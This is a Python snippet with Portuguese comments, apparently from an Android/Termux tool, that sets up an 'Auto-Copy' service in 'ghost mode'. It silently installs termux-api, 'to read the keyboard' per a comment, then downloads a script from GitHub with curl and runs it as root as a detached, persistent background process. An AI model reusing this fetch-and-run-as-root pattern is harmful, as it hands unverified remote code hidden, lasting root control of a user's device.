# ==========================================
# INICIALIZAÇÃO DO AUTO-COPY (MODO FANTASMA)
# ==========================================
print("🚀 Iniciando serviços em background (Auto-Copy)...")
try:
    # 0. Garante que a API do Termux está instalada para ler o teclado!
    os.system("pkg install termux-api -y -q > /dev/null 2>&1")

    # 1. Cria a pasta 'functions' caso ela não exista
    os.makedirs("functions", exist_ok=True)
    
    # 2. Faz o download do script NOVO (auto_copy.py) do seu GitHub
    URL_COPY_PY = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/auto_copy.py"
    os.system(f"curl -sL {URL_COPY_PY} -o functions/auto_copy.py > /dev/null 2>&1")
    
    # 3. O PULO DO GATO: Pega o caminho absoluto do Python e do script
    caminho_python = sys.executable
    caminho_script = os.path.abspath("functions/auto_copy.py")
    
    # 4. Monta o comando de injeção Root (Nohup + Root + Background)
    comando_daemon = f'su -c "nohup {caminho_python} {caminho_script} {device_id} {guild_id} > /dev/null 2>&1 &"'
    
    # 5. Executa a injeção. O script filho agora é independente e imortal.
    os.system(comando_daemon)
    
    print("✅ Módulo Auto-Copy ejetado para o Root do Android com sucesso!")
    print("👻 O Auto-Copy agora é um processo fantasma independente.")
except Exception as e:
    print(f"⚠️ Aviso: Não foi possível iniciar o Auto-Copy. Erro: {e}")
